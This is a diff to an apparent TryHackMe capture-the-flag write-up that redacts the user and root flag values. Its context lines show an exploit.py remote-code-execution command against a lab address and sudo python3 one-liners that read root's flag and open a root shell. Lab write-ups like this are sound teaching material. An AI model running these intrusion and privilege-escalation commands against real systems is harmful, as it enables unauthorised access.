@@ -73,7 +73,7 @@ python3 exploit.py -u http://10.64.169.76:3000 -c "cat /home/daniel/user.txt"
 
 ```
 Success
-THM{R34c7_2_5h311_3xpl017}
+THM{REDACTED}
 ```
 
 RCE confirmed. User flag obtained without even needing a shell.
@@ -125,7 +125,7 @@ sudo python3 -c 'import os; os.system("cat /root/root.txt")'
 ```
 
 ```
-THM{Pr1v_35c_47_175_f1n357}
+THM{REDACTED}
 ```
 
 Or for a full root shell:
@@ -140,8 +140,8 @@ sudo python3 -c 'import os; os.system("/bin/ash")'
 
 | Flag | Value |
 |---|---|
-| User | `THM{R34c7_2_5h311_3xpl017}` |
-| Root | `THM{Pr1v_35c_47_175_f1n357}` |
+| User | `THM{REDACTED}` |
+| Root | `THM{REDACTED}` |
 
 ---
 
